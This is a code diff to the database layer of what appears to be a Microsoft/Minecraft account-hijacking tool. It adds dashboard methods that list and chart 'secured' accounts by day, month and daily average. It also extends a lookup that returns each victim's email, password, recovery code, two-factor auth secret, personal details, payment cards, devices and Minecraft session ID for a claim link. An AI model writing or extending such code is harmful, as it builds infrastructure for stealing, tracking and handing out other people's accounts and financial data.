@@ -192,23 +192,82 @@ class DBConnection:
         """, (user_id, claim_id))
         self.conn.commit()
 
+    # Web Method
+    def get_all_secured_accounts(self) -> list:
+        rows = self.cursor.execute("""
+            SELECT claim_id, ms_email, mc_name, mc_method, mc_gamertag, mc_capes, secured_at
+            FROM secured_accounts
+            ORDER BY secured_at DESC
+            LIMIT 100
+        """).fetchall()
+        keys = ["claim_id", "ms_email", "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at"]
+        return [dict(zip(keys, row)) for row in rows]
+
+    def get_stats(self) -> dict:
+        total = self.cursor.execute("SELECT COUNT(*) FROM secured_accounts").fetchone()[0]
+        has_mc = self.cursor.execute(
+            "SELECT COUNT(*) FROM secured_accounts WHERE mc_name != 'No Minecraft' AND mc_name IS NOT NULL"
+        ).fetchone()[0]
+        shared = self.cursor.execute("SELECT COUNT(*) FROM claimed_accounts").fetchone()[0]
+        return {"total": total, "has_minecraft": has_mc, "shared_links": shared}
+
+    def get_detailed_stats(self) -> dict:
+        best_day = self.cursor.execute("""
+            SELECT DATE(secured_at), COUNT(*) AS cnt
+            FROM secured_accounts
+            GROUP BY DATE(secured_at)
+            ORDER BY cnt DESC LIMIT 1
+        """).fetchone()
+
+        best_month = self.cursor.execute("""
+            SELECT strftime('%Y-%m', secured_at), COUNT(*) AS cnt
+            FROM secured_accounts
+            GROUP BY strftime('%Y-%m', secured_at)
+            ORDER BY cnt DESC LIMIT 1
+        """).fetchone()
+
+        days_active = self.cursor.execute("""
+            SELECT COUNT(DISTINCT DATE(secured_at)) FROM secured_accounts
+        """).fetchone()[0]
+        
+        total = self.cursor.execute("SELECT COUNT(*) FROM secured_accounts").fetchone()[0]
+        daily_avg = round(total / days_active, 1) if days_active else 0
+        return {
+            "best_day": best_day[0] if best_day else None,
+            "best_day_count": best_day[1] if best_day else 0,
+            "best_month": best_month[0] if best_month else None,
+            "best_month_count": best_month[1] if best_month else 0,
+            "daily_avg": daily_avg,
+            "days_active": days_active,
+        }
+
+    def get_chart_data(self) -> list:
+        rows = self.cursor.execute("""
+            SELECT DATE(secured_at) as day, COUNT(*) as secures
+            FROM secured_accounts
+            WHERE secured_at >= DATE('now', '-6 days')
+            GROUP BY DATE(secured_at)
+            ORDER BY day ASC
+        """).fetchall()
+        return [{"day": row[0], "secures": row[1]} for row in rows]
+
     def get_secured_account(self, claim_id: str) -> dict | None:
         row = self.cursor.execute("""
-            SELECT ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
+            SELECT claim_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                    ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                    ms_family, ms_devices, ms_cards,
                    ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
-                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
+                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid, secured_at
             FROM `secured_accounts` WHERE claim_id = ?
         """, (claim_id,)).fetchone()
 
         if not row:
             return None
         keys = [
-            "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
+            "claim_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
             "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday", "ms_language",
             "ms_family", "ms_devices", "ms_cards",
             "ms_subscriptions_active", "ms_subscriptions_canceled", "ms_subscriptions_commercial",
-            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid"
+            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid", "secured_at"
         ]
         return dict(zip(keys, row))
